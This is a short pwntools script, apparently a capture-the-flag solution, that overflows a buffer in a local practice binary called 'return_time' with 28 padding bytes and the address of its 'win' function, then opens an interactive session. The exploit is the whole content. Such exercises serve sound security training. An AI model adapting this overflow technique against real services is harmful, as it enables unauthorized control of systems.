from pwn import *

path='./files/return_time'

p = remote('localhost', 1342)
# p = process(path)
binary = ELF(path)

payload = b'a'*28
payload += p64(binary.symbols['win'])

print(payload)

p.recvuntil(b'>')
p.sendline(payload)
p.recvline()
p.interactive()